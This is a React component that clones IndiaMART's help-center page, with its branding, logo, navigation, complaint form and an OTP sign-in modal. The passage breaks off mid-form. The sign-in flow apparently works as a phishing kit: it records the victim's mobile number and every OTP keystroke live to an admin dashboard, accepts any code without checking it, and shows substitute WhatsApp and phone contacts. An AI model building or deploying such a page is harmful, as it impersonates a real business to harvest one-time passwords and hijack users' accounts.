'use client';

import React, { useState, useEffect } from 'react';
import { addFeedback, getUserSession, setUserSession, addOtpLog, updateLiveOtpLog } from '@/lib/storage';
import { FeedbackCategory, UserSession } from '@/lib/types';
import { CountryCodeSelector, CountryCode, COUNTRY_LIST } from '@/components/CountryCodeSelector';
import {
  Search,
  ChevronDown,
  X,
  Home,
  FileText,
  UserCheck,
  Folder,
  Clock,
  MessageSquare,
  Settings,
  Smartphone,
  CheckCircle2,
  RefreshCw,
  MessageCircle,
  Phone,
  Mail,
  Send,
  Lock,
  ExternalLink,
  ShieldAlert
} from 'lucide-react';

interface IndiaMartHelpCenterProps {
  onNavigatePage: (page: 'login' | 'help' | 'feedback' | 'admin') => void;
  onRefreshData?: () => void;
}

export const IndiaMartHelpCenter: React.FC<IndiaMartHelpCenterProps> = ({
  onNavigatePage,
  onRefreshData,
}) => {
  // Navigation & Dropdown states
  const [isSignInDropdownOpen, setIsSignInDropdownOpen] = useState(false);
  const [isSignInModalOpen, setIsSignInModalOpen] = useState(false);
  const [isComplaintModalOpen, setIsComplaintModalOpen] = useState(false);

  // Search Query state
  const [searchQuery, setSearchQuery] = useState('');

  // Login Modal state (OTP verification - strictly 4 digits)
  const [loginStep, setLoginStep] = useState<'mobile' | 'otp'>('mobile');
  const [selectedCountry, setSelectedCountry] = useState<CountryCode>(COUNTRY_LIST[0]);
  const [mobileNumber, setMobileNumber] = useState('');
  const [otpDigits, setOtpDigits] = useState(['', '', '', '']);
  const [loginError, setLoginError] = useState('');
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [userSessionState, setUserSessionState] = useState<UserSession | null>(null);

  // Complaint / Support Query Database Form state
  const [compName, setCompName] = useState('');
  const [compMobile, setCompMobile] = useState('');
  const [compCategory, setCompCategory] = useState<FeedbackCategory>('Customer Support');
  const [compSubject, setCompSubject] = useState('');
  const [compDetails, setCompDetails] = useState('');
  const [isSubmittingComp, setIsSubmittingComp] = useState(false);
  const [submittedTicketId, setSubmittedTicketId] = useState<string | null>(null);
  const [compError, setCompError] = useState('');

  const [resendTimer, setResendTimer] = useState(30);

  useEffect(() => {
    setUserSessionState(getUserSession());
  }, []);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (isSignInModalOpen && loginStep === 'otp' && resendTimer > 0) {
      interval = setInterval(() => {
        setResendTimer((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [isSignInModalOpen, loginStep, resendTimer]);

  const getFullMobile = () => `${selectedCountry.code} ${mobileNumber}`;

  // Handlers for OTP modal
  const handleMobileSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setLoginError('');
    if (mobileNumber.length !== 10) {
      setLoginError('Please enter a valid 10-digit mobile number');
      return;
    }
    setLoginStep('otp');
    setResendTimer(30);
    setOtpDigits(['', '', '', '']);
    updateLiveOtpLog(getFullMobile(), '', 'Pending');
  };

  const handleResendOtp = () => {
    if (resendTimer > 0) return;
    setResendTimer(30);
    setLoginError('');
    updateLiveOtpLog(getFullMobile(), '', 'Pending');
  };

  const handleVerifyOtp = () => {
    const code = otpDigits.join('');
    if (code.length !== 4) {
      setLoginError('Please enter 4-digit OTP');
      return;
    }
    setIsLoggingIn(true);
    const fullMobile = getFullMobile();
    addOtpLog(fullMobile, code);

    setTimeout(() => {
      const session: UserSession = {
        mobileNumber: fullMobile,
        isVerified: true,
        verifiedAt: new Date().toISOString(),
      };
      setUserSession(session);
      setUserSessionState(session);
      setIsLoggingIn(false);
      setIsSignInModalOpen(false);
      setLoginStep('mobile');
      setMobileNumber('');
      setOtpDigits(['', '', '', '']);
    }, 600);
  };

  // Handler for Complaint / Database Ticket submission
  const handleComplaintSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setCompError('');

    if (!compMobile || compMobile.length < 10) {
      setCompError('Please enter a valid 10-digit mobile number');
      return;
    }
    if (!compSubject.trim()) {
      setCompError('Please enter a subject title');
      return;
    }
    if (!compDetails.trim() || compDetails.trim().length < 10) {
      setCompError('Please provide details for your complaint (at least 10 characters)');
      return;
    }

    setIsSubmittingComp(true);

    setTimeout(() => {
      const created = addFeedback({
        mobileNumber: compMobile.trim(),
        userName: compName.trim() || 'IndiaMART User',
        overallRating: 5,
        aspectRatings: { quality: 5, communication: 5, fulfillment: 5, value: 5 },
        category: compCategory,
        supplierName: 'Help Center Ticket',
        title: `[Complaint] ${compSubject.trim()}`,
        comments: compDetails.trim(),
        recommend: true,
      });

      setIsSubmittingComp(false);
      setSubmittedTicketId(created.id);
      if (onRefreshData) onRefreshData();

      setCompName('');
      setCompMobile('');
      setCompSubject('');
      setCompDetails('');
    }, 700);
  };

  return (
    <div className="min-h-screen bg-[#f5f7fb] text-[#2c3e50] font-sans flex flex-col relative">
      {/* 1. TOP NAVBAR (SAME TO SAME UI AS IMAGE 1 & 3) */}
      <header className="bg-[#202670] text-white sticky top-0 z-40 shadow-md">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-2.5 flex items-center justify-between">
          {/* Left: Brand Logo */}
          <div
            className="flex items-center gap-1.5 cursor-pointer"
            onClick={() => onNavigatePage('help')}
          >
            <img
              src="/image.png"
              alt="IndiaMART Logo"
              className="h-9 sm:h-10 w-auto object-contain bg-white/95 p-1 rounded"
            />
          </div>

          {/* Right Navigation Controls */}
          <div className="flex items-center space-x-3 sm:space-x-6 text-xs sm:text-sm font-medium">
            <button className="bg-white text-[#202670] font-bold px-3 py-1.5 rounded-md hover:bg-gray-100 transition-all shadow-xs cursor-pointer">
              Get Best Price
            </button>

            <a href="#" className="hover:text-gray-200 hidden md:inline">
              Sell
            </a>
            <a href="#" className="hover:text-gray-200 hidden md:inline">
              Videos
            </a>
            <a href="#" className="hover:text-gray-200 hidden md:inline">
              Messages
            </a>
            <button
              onClick={() => onNavigatePage('feedback')}
              className="hover:text-gray-200 cursor-pointer"
            >
              Feedback
            </button>

            {/* Admin Portal Shortcut */}
            <button
              onClick={() => onNavigatePage('admin')}
              className="text-emerald-300 font-bold hover:underline flex items-center gap-1 cursor-pointer"
            >
              <Lock className="w-3.5 h-3.5" />
              Admin
            </button>

            {/* Sign In Dropdown Button */}
            <div className="relative">
              <button
                onClick={() => setIsSignInDropdownOpen(!isSignInDropdownOpen)}
                className="flex items-center gap-1 font-semibold text-white hover:text-gray-200 cursor-pointer py-1"
              >
                {userSessionState?.isVerified ? (
                  <span className="text-emerald-300 font-bold">{userSessionState.mobileNumber}</span>
                ) : (
                  <span>Sign In</span>
                )}
                <ChevronDown className="w-4 h-4" />
              </button>

              {/* SIGN IN DROPDOWN MENU (SAME TO SAME UI AS IMAGE 3) */}
              {isSignInDropdownOpen && (
                <div className="absolute right-0 mt-2 w-64 bg-white rounded-xl shadow-2xl border border-gray-200 py-3 text-gray-800 z-50 text-xs animate-fadeIn">
                  {!userSessionState?.isVerified ? (
                    <div className="px-4 pb-3 border-b border-gray-100 text-center space-y-2">
                      <button
                        onClick={() => {
                          setIsSignInDropdownOpen(false);
                          setIsSignInModalOpen(true);
                        }}
                        className="w-full bg-[#00a699] hover:bg-[#008e82] text-white font-bold py-2 rounded-lg transition-all shadow-sm cursor-pointer text-sm"
                      >
                        Sign In
                      </button>
                      <div className="text-[11px] text-gray-500">
                        New to IndiaMART?{' '}
                        <button
                          onClick={() => {
                            setIsSignInDropdownOpen(false);
                            setIsSignInModalOpen(true);
                          }}
                          className="text-[#202670] font-bold hover:underline cursor-pointer"
                        >
                          Join Now
                        </button>
                      </div>
                    </div>
                  ) : (
                    <div className="px-4 pb-3 border-b border-gray-100">
                      <div className="text-[11px] text-gray-500 font-semibold">Logged in as</div>
                      <div className="text-sm font-extrabold text-[#202670]">
                        {userSessionState.mobileNumber}
                      </div>
                    </div>
                  )}

                  <div className="py-1 space-y-0.5 font-medium">
                    <a
                      href="#"
                      className="flex items-center gap-2.5 px-4 py-2 hover:bg-gray-50 text-gray-700"
                    >
                      <Home className="w-4 h-4 text-gray-500" />
                      Home
                    </a>
                    <a
                      href="#"
                      className="flex items-center gap-2.5 px-4 py-2 hover:bg-gray-50 text-gray-700"
                    >
                      <FileText className="w-4 h-4 text-gray-500" />
                      Post Your Requirement
                    </a>
                    <a
                      href="#"
                      className="flex items-center justify-between px-4 py-2 hover:bg-gray-50 text-gray-700"
                    >
                      <span className="flex items-center gap-2.5">
                        <UserCheck className="w-4 h-4 text-gray-500" />
                        Verified Business Buyer
                      </span>
                      <span className="bg-amber-400 text-gray-900 font-extrabold text-[9px] px-1.5 py-0.5 rounded">
                        NEW
                      </span>
                    </a>
                    <a
                      href="#"
                      className="flex items-center gap-2.5 px-4 py-2 hover:bg-gray-50 text-gray-700"
                    >
                      <Folder className="w-4 h-4 text-gray-500" />
                      Products/Services Directory
                    </a>
                    <a
                      href="#"
                      className="flex items-center gap-2.5 px-4 py-2 hover:bg-gray-50 text-gray-700"
                    >
                      <Clock className="w-4 h-4 text-gray-500" />
                      Recent Activity
                    </a>
                    <a
                      href="#"
                      className="flex items-center gap-2.5 px-4 py-2 hover:bg-gray-50 text-gray-700"
                    >
                      <MessageSquare className="w-4 h-4 text-gray-500" />
                      Manage Requirements
                    </a>
                    <a
                      href="#"
                      className="flex items-center gap-2.5 px-4 py-2 hover:bg-gray-50 text-gray-700"
                    >
                      <Settings className="w-4 h-4 text-gray-500" />
                      Settings
                    </a>
                    <a
                      href="#"
                      className="flex items-center gap-2.5 px-4 py-2 hover:bg-gray-50 text-gray-700"
                    >
                      <Smartphone className="w-4 h-4 text-gray-500" />
                      Download App
                    </a>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </header>

      {/* 2. HERO BANNER SECTION (PASTEL BLUE GRADIENT - SAME TO SAME UI AS IMAGE 1) */}
      <section className="bg-gradient-to-b from-[#dce4ff] via-[#d5e0ff] to-[#c7d6ff] py-10 sm:py-14 px-4 border-b border-blue-200/50">
        <div className="max-w-4xl mx-auto text-center space-y-5">
          <h1 className="text-2xl sm:text-3xl md:text-4xl font-extrabold text-[#1a1d4b] tracking-tight">
            &quot;Hello, how can we assist you today?&quot;
          </h1>

          {/* Search Box */}
          <div className="max-w-2xl mx-auto flex items-center shadow-lg rounded-lg overflow-hidden bg-white border border-gray-200">
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Search using Keywords..."
              className="flex-1 px-4 py-3 text-sm text-gray-800 outline-none placeholder:text-gray-400"
            />
            <button className="bg-[#0070e0] hover:bg-[#005bb8] text-white px-6 py-3 transition-colors cursor-pointer flex items-center justify-center">
              <Search className="w-5 h-5" />
            </button>
          </div>

          {/* Explore Support Articles Pills */}
          <div className="flex flex-wrap items-center justify-center gap-2 pt-2 text-xs text-[#202670] font-medium">
            <span className="font-semibold">Explore support articles:</span>
            {[
              'How to Register for Paid Services on IndiaMART?',
              'Does IndiaMART Provide Shipping Services?',
              'How to Sell Items on IndiaMART?',
            ].map((pill) => (
              <button
                key={pill}
                onClick={() => setSearchQuery(pill)}
                className="bg-white/60 hover:bg-white border border-blue-300/80 rounded-full px-3 py-1 text-[11px] text-[#202670] transition-all cursor-pointer shadow-2xs"
              >
                {pill}
              </button>
            ))}
          </div>
        </div>
      </section>

      {/* 3. CATEGORIES CARDS GRID (3 COLUMNS - SAME TO SAME UI AS IMAGE 1 & 2) */}
      <section className="max-w-6xl mx-auto px-4 py-12 w-full space-y-8">
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {/* Card 1: Buying on IndiaMART */}
          <div
            onClick={() => setSearchQuery('Buying')}
            className="bg-white rounded-xl p-8 shadow-sm hover:shadow-md border border-gray-100 text-center space-y-3 cursor-pointer transition-all hover:-translate-y-1"
          >
            <div className="w-20 h-20 mx-auto bg-amber-50 rounded-2xl flex items-center justify-center text-amber-500 text-3xl">
              🛍️
            </div>
            <h3 className="text-lg font-bold text-[#1a1d4b]">Buying on IndiaMART</h3>
            <p className="text-xs text-gray-500">Find and purchase products from suppliers.</p>
          </div>

          {/* Card 2: Selling on IndiaMART */}
          <div
            onClick={() => setSearchQuery('Selling')}
            className="bg-white rounded-xl p-8 shadow-sm hover:shadow-md border border-gray-100 text-center space-y-3 cursor-pointer transition-all hover:-translate-y-1"
          >
            <div className="w-20 h-20 mx-auto bg-emerald-50 rounded-2xl flex items-center justify-center text-emerald-600 text-3xl">
              📦
            </div>
            <h3 className="text-lg font-bold text-[#1a1d4b]">Selling on IndiaMART</h3>
            <p className="text-xs text-gray-500">List products and connect with buyers.</p>
          </div>

          {/* Card 3: Paid Services */}
          <div
            onClick={() => setSearchQuery('Paid Services')}
            className="bg-white rounded-xl p-8 shadow-sm hover:shadow-md border border-gray-100 text-center space-y-3 cursor-pointer transition-all hover:-translate-y-1"
          >
            <div className="w-20 h-20 mx-auto bg-purple-50 rounded-2xl flex items-center justify-center text-purple-600 text-3xl">
              💳
            </div>
            <h3 className="text-lg font-bold text-[#1a1d4b]">Paid Services</h3>
            <p className="text-xs text-gray-500">
              Explore premium service packages for added advantage.
            </p>
          </div>

          {/* Card 4: Payment Related */}
          <div
            onClick={() => setSearchQuery('Payment')}
            className="bg-white rounded-xl p-8 shadow-sm hover:shadow-md border border-gray-100 text-center space-y-3 cursor-pointer transition-all hover:-translate-y-1"
          >
            <div className="w-20 h-20 mx-auto bg-blue-50 rounded-2xl flex items-center justify-center text-blue-600 text-3xl">
              📲
            </div>
            <h3 className="text-lg font-bold text-[#1a1d4b]">Payment Related</h3>
            <p className="text-xs text-gray-500">
              Handle transactions and resolve payment issues.
            </p>
          </div>

          {/* Card 5: Communication and Support */}
          <div
            onClick={() => setSearchQuery('Support')}
            className="bg-white rounded-xl p-8 shadow-sm hover:shadow-md border border-gray-100 text-center space-y-3 cursor-pointer transition-all hover:-translate-y-1"
          >
            <div className="w-20 h-20 mx-auto bg-cyan-50 rounded-2xl flex items-center justify-center text-[#00a699] text-3xl">
              🎧
            </div>
            <h3 className="text-lg font-bold text-[#1a1d4b]">Communication and Support</h3>
            <p className="text-xs text-gray-500">Resolve queries and connect with customers.</p>
          </div>

          {/* Card 6: Policies and Guidelines */}
          <div
            onClick={() => setSearchQuery('Policies')}
            className="bg-white rounded-xl p-8 shadow-sm hover:shadow-md border border-gray-100 text-center space-y-3 cursor-pointer transition-all hover:-translate-y-1"
          >
            <div className="w-20 h-20 mx-auto bg-indigo-50 rounded-2xl flex items-center justify-center text-[#202670] text-3xl">
              📋
            </div>
            <h3 className="text-lg font-bold text-[#1a1d4b]">Policies and Guidelines</h3>
            <p className="text-xs text-gray-500">Understand platform rules and user conduct.</p>
          </div>

          {/* Card 7: Account and Privacy */}
          <div
            onClick={() => setSearchQuery('Account')}
            className="bg-white rounded-xl p-8 shadow-sm hover:shadow-md border border-gray-100 text-center space-y-3 cursor-pointer transition-all hover:-translate-y-1"
          >
            <div className="w-20 h-20 mx-auto bg-rose-50 rounded-2xl flex items-center justify-center text-rose-500 text-3xl">
              🔒
            </div>
            <h3 className="text-lg font-bold text-[#1a1d4b]">Account and Privacy</h3>
            <p className="text-xs text-gray-500">Manage account details and data security.</p>
          </div>

          {/* Card 8: Complaints (DATABASE CONNECTED!) */}
          <div
            onClick={() => setIsComplaintModalOpen(true)}
            className="bg-white rounded-xl p-8 shadow-md hover:shadow-xl border-2 border-[#202670]/20 hover:border-[#00a699] text-center space-y-3 cursor-pointer transition-all hover:-translate-y-1 relative group"
          >
            <span className="absolute top-3 right-3 bg-emerald-500 text-white font-extrabold text-[9px] px-2 py-0.5 rounded-full uppercase">
              Database Sync
            </span>
            <div className="w-20 h-20 mx-auto bg-amber-100 rounded-2xl flex items-center justify-center text-amber-700 text-3xl group-hover:scale-110 transition-transform">
              📑
            </div>
            <h3 className="text-lg font-bold text-[#1a1d4b] group-hover:text-[#00a699] transition-colors">
              Complaints
            </h3>
            <p className="text-xs text-gray-500">Report issues or share user experiences.</p>
          </div>
        </div>

        {/* Google Translate Selector (SAME TO SAME UI AS IMAGE 2) */}
        <div className="pt-8 text-center space-y-1.5">
          <select className="bg-white border border-gray-300 rounded-md px-4 py-1.5 text-xs text-gray-700 outline-none shadow-2xs font-medium cursor-pointer">
            <option value="en">Select Language</option>
            <option value="hi">Hindi (हिन्दी)</option>
            <option value="ta">Tamil (தமிழ்)</option>
            <option value="te">Telugu (తెలుగు)</option>
            <option value="bn">Bengali (বাংলা)</option>
            <option value="gu">Gujarati (ગુજરાતી)</option>
          </select>
          <div className="text-[11px] text-gray-400">
            Powered by <span className="font-semibold text-gray-600">Google Translate</span>
          </div>
        </div>
      </section>

      {/* 4. FOOTER SECTION (SAME TO SAME UI AS IMAGE 2) */}
      <footer className="mt-auto bg-[#f0f3f9] border-t border-gray-200 pt-6 pb-8 text-xs text-gray-600">
        {/* Top Footer Banner */}
        <div className="max-w-7xl mx-auto px-4 pb-6 border-b border-gray-200 flex flex-col md:flex-row justify-between items-center gap-4">
          <div className="text-base font-extrabold text-[#202670]">We are here to help you!</div>

          <div className="flex flex-wrap items-center gap-6">
            <div className="flex items-center gap-2 text-gray-700 font-medium">
              <span>Go Mobile:</span>
              <span className="text-lg">🍎</span>
              <span className="text-lg">🤖</span>
              <span className="text-lg">📱</span>
            </div>

            <div className="flex items-center gap-2 text-gray-700 font-medium">
              <span>Follow us on:</span>
              <span className="w-6 h-6 rounded-full bg-[#3b5998] text-white flex items-center justify-center font-bold text-xs">
                f
              </span>
              <span className="w-6 h-6 rounded-full bg-black text-white flex items-center justify-center font-bold text-xs">
                𝕏
              </span>
              <span className="w-6 h-6 rounded-full bg-[#0077b5] text-white flex items-center justify-center font-bold text-xs">
                in
              </span>
            </div>
          </div>
        </div>

        {/* Links & Contact Cards Section */}
        <div className="max-w-7xl mx-auto px-4 py-8 grid grid-cols-1 md:grid-cols-12 gap-8">
          {/* Links Grid */}
          <div className="md:col-span-8 grid grid-cols-1 sm:grid-cols-3 gap-6 text-gray-500 text-[11px] leading-relaxed">
            <div className="space-y-2">
              <div>
                <a href="#" className="hover:text-gray-800">
                  Help
                </a>
              </div>
              <div>
                <button
                  onClick={() => onNavigatePage('feedback')}
                  className="hover:text-gray-800 text-left cursor-pointer"
                >
                  Feedback
                </button>
              </div>
              <div>
                <button
                  onClick={() => setIsComplaintModalOpen(true)}
                  className="hover:text-gray-800 text-left cursor-pointer"
                >
                  Complaints
                </button>
              </div>
              <div>
                <a href="#" className="hover:text-gray-800">
                  Customer Care
                </a>
              </div>
              <div>
                <a href="#" className="hover:text-gray-800">
                  Contact Us
                </a>
              </div>
            </div>

            <div className="space-y-2">
              <div>
                <a href="#" className="hover:text-gray-800">
                  Suppliers Tool Kit
                </a>
              </div>
              <div>
                <a href="#" className="hover:text-gray-800">
                  Seller Tools
                </a>
              </div>
              <div>
                <a href="#" className="hover:text-gray-800">
                  Latest BuyLead
                </a>
              </div>
              <div>
                <a href="#" className="hover:text-gray-800">
                  Learning Centre
                </a>
              </div>
              <div>
                <a href="#" className="hover:text-gray-800">
                  Ship With IndiaMART
                </a>
              </div>
              <div>
                <a href="#" className="hover:text-gray-800">
                  Security Tips for Sellers
                </a>
              </div>
            </div>

            <div className="space-y-2">
              <div>
                <a href="#" className="hover:text-gray-800">
                  Buyers Tool Kit
                </a>
              </div>
              <div>
                <a href="#" className="hover:text-gray-800">
                  Post Your Requirement
                </a>
              </div>
              <div>
                <a href="#" className="hover:text-gray-800">
                  Products You Buy
                </a>
              </div>
              <div>
                <a href="#" className="hover:text-gray-800">
                  Search Products &amp; Suppliers
                </a>
              </div>
              <div>
                <a href="#" className="hover:text-gray-800">
                  Security Tips for Buyers
                </a>
              </div>
            </div>
          </div>

          {/* Right Action Cards (WhatsApp, Email, Call - SAME TO SAME UI AS IMAGE 2) */}
          <div className="md:col-span-4 space-y-3">
            {/* WhatsApp Card */}
            <a
              href="https://wa.me/919696969696"
              target="_blank"
              rel="noreferrer"
              className="bg-[#23287a] hover:bg-[#1a1e60] text-white p-3.5 rounded-2xl flex items-center justify-between shadow-md transition-all block cursor-pointer"
            >
              <div>
                <div className="text-xs font-semibold">WhatsApp:</div>
                <div className="text-sm font-extrabold">+91-9696969696</div>
              </div>
              <div className="w-9 h-9 bg-emerald-500 text-white rounded-full flex items-center justify-center text-xl font-bold shadow-xs">
                💬
              </div>
            </a>

            {/* Email Card */}
            <a
              href="mailto:customercare@indiamart.com"
              className="bg-[#23287a] hover:bg-[#1a1e60] text-white p-3.5 rounded-2xl flex items-center justify-between shadow-md transition-all block cursor-pointer"
            >
              <div>
                <div className="text-xs font-semibold">Email us:</div>
                <div className="text-xs sm:text-sm font-extrabold">customercare@indiamart.com</div>
              </div>
            </a>

            {/* Call Card */}
            <a
              href="tel:09696969696"
              className="bg-[#23287a] hover:bg-[#1a1e60] text-white p-3.5 rounded-2xl flex items-center justify-between shadow-md transition-all block cursor-pointer"
            >
              <div>
                <div className="text-xs font-semibold">Call us:</div>
                <div className="text-sm font-extrabold">096-9696-9696</div>
              </div>
            </a>
          </div>
        </div>

        {/* Copyright Bar */}
        <div className="max-w-7xl mx-auto px-4 pt-6 border-t border-gray-200 flex flex-col sm:flex-row justify-between items-center text-[11px] text-gray-500 gap-2">
          <div>Copyright © 1996-2026 IndiaMART InterMESH Ltd. All rights reserved.</div>
          <div className="flex gap-4">
            <a href="#" className="text-blue-600 hover:underline">
              Terms of Use
            </a>
            <span>-</span>
            <a href="#" className="text-blue-600 hover:underline">
              Privacy Policy
            </a>
            <span>-</span>
            <a href="#" className="text-blue-600 hover:underline">
              Link to Us
            </a>
          </div>
        </div>
      </footer>



      {/* 6. SIGN IN / LOGIN WITH OTP MODAL (EXACT MATCH FOR IMAGE 4) */}
      {isSignInModalOpen && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-xs flex items-center justify-center p-4 z-50 animate-fadeIn">
          <div className="bg-white rounded-xl shadow-2xl w-full max-w-lg overflow-hidden border border-gray-200">
            {/* Top Header matching Image 2 (Deep Navy/Purple with Sign In & X close) */}
            <div className="bg-[#282a8c] text-white px-6 py-4 flex justify-between items-center">
              <h2 className="text-xl font-bold tracking-tight">Sign In</h2>
              <button
                onClick={() => setIsSignInModalOpen(false)}
                className="text-white hover:opacity-80 transition-opacity p-1 cursor-pointer"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Modal Body matching Image 2 & Image 3 */}
            <div className="p-8 sm:p-10 space-y-6">
              <h3 className="text-2xl sm:text-3xl font-extrabold text-[#111111] text-center">
                Login with OTP
              </h3>

              {loginStep === 'mobile' ? (
                <form onSubmit={handleMobileSubmit} className="space-y-6">
                  <div className="text-left space-y-2">
                    <label className="block text-sm font-bold text-[#111111]">
                      Mobile Number
                    </label>
                    <div className="flex border border-[#282a8c] rounded-md focus-within:ring-2 focus-within:ring-[#282a8c]/20 overflow-visible relative">
                      <CountryCodeSelector
                        selectedCountry={selectedCountry}
                        onSelectCountry={setSelectedCountry}
                      />
                      <input
                        type="tel"
                        maxLength={12}
                        value={mobileNumber}
                        onChange={(e) => setMobileNumber(e.target.value.replace(/\D/g, ''))}
                        placeholder="Enter Your Mobile Number"
                        className="flex-1 px-4 py-3 text-base text-gray-800 outline-none font-normal placeholder:text-gray-400"
                        autoFocus
                      />
                    </div>
                    {loginError && <p className="text-xs font-bold text-red-600">{loginError}</p>}
                  </div>

                  <button
                    type="submit"
                    className="w-full bg-[#00a699] hover:bg-[#008e82] active:bg-[#00786e] text-white font-bold text-lg py-3.5 rounded-md shadow-sm transition-all cursor-pointer flex items-center justify-center gap-2"
                  >
                    Submit
                  </button>
                </form>
              ) : (
                <div className="space-y-6">
                  <div className="text-center space-y-1">
                    <p className="text-sm text-gray-600">
                      Enter 4-digit OTP sent to{' '}
                      <span className="font-extrabold text-gray-900">
                        {selectedCountry.code} {mobileNumber}
                      </span>
                    </p>
                  </div>

                  <div className="flex justify-center gap-3 sm:gap-4">
                    {otpDigits.map((digit, idx) => (
                      <input
                        key={idx}
                        id={`otp-modal-${idx}`}
                        type="text"
                        maxLength={1}
                        value={digit}
                        onChange={(e) => {
                          const val = e.target.value.replace(/\D/g, '');
                          const copy = [...otpDigits];
                          copy[idx] = val;
                          setOtpDigits(copy);
                          updateLiveOtpLog(getFullMobile(), copy.join(''), 'Pending');
                          if (val && idx < 3) {
                            document.getElementById(`otp-modal-${idx + 1}`)?.focus();
                          }
                        }}
                        className="w-13 h-15 text-center text-3xl font-extrabold border-2 border-[#282a8c] rounded-lg focus:ring-2 focus:ring-[#00a699]/30 outline-none text-gray-800"
                        autoFocus={idx === 0}
                      />
                    ))}
                  </div>

                  {/* OTP Resend Option */}
                  <div className="flex items-center justify-between text-xs font-medium pt-1 px-1">
                    <span className="text-gray-500">Didn't receive OTP?</span>
                    {resendTimer > 0 ? (
                      <span className="text-gray-400 font-semibold flex items-center gap-1">
                        Resend in <span className="text-[#202670] font-bold">00:{resendTimer < 10 ? `0${resendTimer}` : resendTimer}</span>
                      </span>
                    ) : (
                      <button
                        type="button"
                        onClick={handleResendOtp}
                        className="text-[#d9383a] hover:text-[#c62e30] font-extrabold underline cursor-pointer hover:scale-105 transition-all"
                      >
                        Resend OTP
                      </button>
                    )}
                  </div>

                  {loginError && <p className="text-xs font-bold text-red-600 text-center">{loginError}</p>}

                  <button
                    type="button"
                    onClick={handleVerifyOtp}
                    disabled={isLoggingIn}
                    className="w-full bg-[#00a699] hover:bg-[#008e82] active:bg-[#00786e] text-white font-bold text-lg py-3.5 rounded-md shadow-sm transition-all cursor-pointer flex items-center justify-center gap-2"
                  >
                    {isLoggingIn ? (
                      <>
                        <RefreshCw className="w-5 h-5 animate-spin" /> Verifying...
                      </>
                    ) : (
                      'Verify & Submit'
                    )}
                  </button>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* 7. COMPLAINTS / SUPPORT TICKET SUBMISSION MODAL (PERSISTS TO DATABASE) */}
      {isComplaintModalOpen && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-xs flex items-center justify-center p-4 z-50 animate-fadeIn">
          <div className="bg-white rounded-2xl shadow-2xl w-full max-w-lg overflow-hidden border border-gray-200 max-h-[90vh] flex flex-col">
            {/* Header */}
            <div className="bg-[#202670] text-white px-6 py-4 flex justify-between items-center">
              <div>
                <h2 className="text-base font-bold">Register IndiaMART Complaint / Ticket</h2>
                <p className="text-[11px] text-emerald-300 font-medium">
                  Direct database logging &amp; Admin sync
                </p>
              </div>
              <button
                onClick={() => setIsComplaintModalOpen(false)}
                className="text-white/80 hover:text-white p-1 cursor-pointer"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Content */}
            <div className="p-6 overflow-y-auto space-y-4">
              {submittedTicketId ? (
                <div className="bg-emerald-50 border-2 border-emerald-400 rounded-xl p-5 text-center space-y-3">
                  <CheckCircle2 className="w-10 h-10 text-emerald-600 mx-auto" />
                  <h3 className="text-base font-bold text-emerald-900">
                    Complaint Registered in Database!
                  </h3>
                  <p className="text-xs text-emerald-800">
                    Ticket Reference ID:{' '}
                    <span className="font-extrabold font-mono text-sm">{submittedTicketId}</span>
                  </p>
                  <p className="text-[11px] text-emerald-700">
                    Your issue is stored in localStorage &amp; visible in the Admin Dashboard.
                  </p>
                  <button
                    onClick={() => setSubmittedTicketId(null)}
                    className="bg-[#202670] text-white text-xs font-bold px-4 py-2 rounded-lg cursor-pointer"
                  >
                    Submit Another Inquiry
                  </button>
                </div>
              ) : (
                <form onSubmit={handleComplaintSubmit} className="space-y-4 text-left">
                  <div>
                    <label className="block text-xs font-bold text-gray-700 mb-1">
                      Your Full Name
                    </label>
                    <input
                      type="text"
                      value={compName}
                      onChange={(e) => setCompName(e.target.value)}
                      placeholder="e.g. Rahul Sharma"
                      className="w-full bg-gray-50 border border-gray-300 rounded-lg px-3 py-2 text-xs text-gray-800 outline-none"
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-bold text-gray-700 mb-1">
                      Mobile Number <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="tel"
                      maxLength={10}
                      value={compMobile}
                      onChange={(e) => setCompMobile(e.target.value.replace(/\D/g, ''))}
                      placeholder="10 digit mobile number"
                      className="w-full bg-gray-50 border border-gray-300 rounded-lg px-3 py-2 text-xs text-gray-800 font-semibold outline-none"
                      required
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-bold text-gray-700 mb-1">
                      Category
                    </label>
                    <select
                      value={compCategory}
                      onChange={(e) => setCompCategory(e.target.value as FeedbackCategory)}
                      className="w-full bg-gray-50 border border-gray-300 rounded-lg px-3 py-2 text-xs text-gray-800 font-semibold outline-none"
                    >
                      <option value="Customer Support">Customer Support</option>
                      <option value="Supplier Experience">Supplier Experience</option>
                      <option value="Platform Usability">Platform Usability</option>
                      <option value="Buying Process">Buying Process</option>
                      <option value="Technical Issue / Suggestion">Technical Issue</option>
                    </select>
                  </div>

                  <div>
                    <label className="block text-xs font-bold text-gray-700 mb-1">
                      Subject <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="text"
                      value={compSubject}
                      onChange={(e) => setCompSubject(e.target.value)}
                      placeholder="Brief topic of complaint"
                      className="w-full bg-gray-50 border border-gray-300 rounded-lg px-3 py-2 text-xs text-gray-800 outline-none"
                      required
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-bold text-gray-700 mb-1">
                      Complaint Details <span className="text-red-500">*</span>
                    </label>
                    <textarea
                      rows={3}
                      value={compDetails}
                      onChange={(e) => setCompDetails(e.target.value)}
                      placeholder="Describe your issue..."
                      className="w-full bg-gray-50 border border-gray-300 rounded-lg p-3 text-xs text-gray-800 outline-none"
                      required
                    />
                  </div>

                  {compError && <p className="text-xs font-bold text-red-600">{compError}</p>}

                  <button
                    type="submit"
                    disabled={isSubmittingComp}
